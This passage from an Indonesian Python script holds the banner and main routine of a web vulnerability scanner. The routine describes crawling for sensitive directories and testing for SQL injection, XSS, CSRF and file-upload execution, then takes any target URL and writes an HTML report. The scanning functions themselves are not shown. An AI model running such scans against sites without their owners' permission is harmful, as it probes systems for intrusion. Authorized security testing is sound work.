   :+smmdymmmd.    /mmhhmmmdo+-  `odmmmdho++oydmmmd` ommh++ymmmms++dmm:    
     -mmh.dmmmy`  .dmd.smmmd`    smmmmh-      .yddd` omms  ommmm:  hmm:    
     -mmh :mmmmo `hmm/ smmmd`   -mmmmd.        `---  /ss+  ommmm:  oss-    
     -mmh  +mmmm:smms  smmmd`   /mmmmh                     ommmm-          
     -mmh   ymmmdmmh`  smmmd`   -mmmmd.        .hs/-       ommmm-          
     .mmh   `hmmmmd.   smmmd`    smmmmh:`    `:hmmm/       ommmm-          
   :osmmdoo. -dmmm/  +ohmmmmoo-  `ommmmmdysoyhmmmd/     -oohmmmmsoo`       
   ommmmmmm:  /mms   dmmmmmmmm/    .+ydmmmmmmmdy/`      /mmmmmmmmmd`       
   .-------`   --`   ---------`      ``.-::-..`         `---------- 
    <=- Majalengka Cyber Tester -=>
    ============================================
    """, justify="center", style="bold green"), 
        box=box.DOUBLE, 
        title="WEB SECURITY TEST TOOL", 
        title_align="center", 
        subtitle="Versi 1.0", 
        subtitle_align="center"
    ))

    # Deskripsi Alat dengan Rich dan Pewarnaan
    console.print(Text("Selamat datang di alat pengujian keamanan web kami!\n", style="bold cyan"))
    
    console.print(Text("Fitur Utama:", style="bold underline green"))
    console.print("""
    1. [bold]Pemindaian Crawling[/bold]: Mengumpulkan data dari situs web target, termasuk file dan direktori sensitif.
    2. [bold]Pengujian Kerentanan[/bold]: Mengidentifikasi kerentanan potensial seperti SQL Injection, XSS, CSRF, dll.
    3. [bold]Pengujian Upload File[/bold]: Menguji apakah file yang diunggah dapat diakses atau dieksekusi.
    4. [bold]Laporan HTML Profesional[/bold]: Menghasilkan laporan HTML terperinci dengan tampilan yang responsif dan profesional.
    """, style="white")

    console.print(Text("Deskripsi Fitur:", style="bold underline green"))
    console.print("""
    - [bold]Pemindaian Crawling[/bold]: Merayapi situs web untuk menemukan file, direktori sensitif, dan formulir input.
    - [bold]Pengujian Kerentanan[/bold]: Menggunakan teknik pengujian untuk mendeteksi kerentanan umum seperti SQLi dan XSS.
    - [bold]Pengujian Upload File[/bold]: Menguji apakah file yang diunggah dapat diakses atau dieksekusi.
    - [bold]Laporan HTML Profesional[/bold]: Menghasilkan laporan yang komprehensif dalam format HTML dengan tampilan Bootstrap.
    """, style="white")

    console.print(Text("Cara Penggunaan:", style="bold underline green"))
    console.print("""
    1. [bold cyan]Masukkan URL Target[/[bold cyan]: Ketikkan URL situs web yang ingin diuji.
    2. [bold cyan]Tunggu Proses[/[bold cyan]: Alat akan menjalankan pemindaian dan pengujian otomatis.
    3. [bold cyan]Tunggu Laporan[/[bold cyan]: Setelah proses selesai, laporan akan disimpan sebagai file HTML.
    """, style="white")

    console.print(Panel(
        "[bold yellow]Masukkan URL Target[/bold yellow] untuk memulai pengujian!",
        title="SIAP UNTUK MULAI?", 
        title_align="center", 
        box=box.HEAVY))

    # Ambil tanggal dan waktu untuk penamaan file laporan
    date = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    try:
        # Input URL target
        target_url = console.input("[bold cyan]Masukkan URL Target: [/]").strip()
        if not target_url:
            logger.error("URL target tidak boleh kosong.")
            return
        
        console.print("[bold green]Mulai Proses Crawling...[/bold green]")
        # Simulasi crawling
        crawled_data, accessible_folders, forbidden_folders, form_data = crawl_website(target_url)
        
        console.print("[bold green]Mulai Proses Vulnerability Assessment...[/bold green]")
        # Simulasi vulnerability testing
        vulnerabilities = test_vulnerabilities(crawled_data, form_data)
        
        console.print("[bold green]Mulai Proses Generate Report...[/bold green]")
        # Simulasi pembuatan report
        report_filename = "report_{}.html".format(date)
        generate_html_report(crawled_data, vulnerabilities, target_url, date)
        
        console.print(f"[bold cyan]Laporan keamanan telah dibuat dan disimpan sebagai {report_filename}[/bold cyan]")

    except Exception as e:
        console.print(f"[bold red]Terjadi kesalahan: {e}[/bold red]")

if __name__ == "__main__":
    main()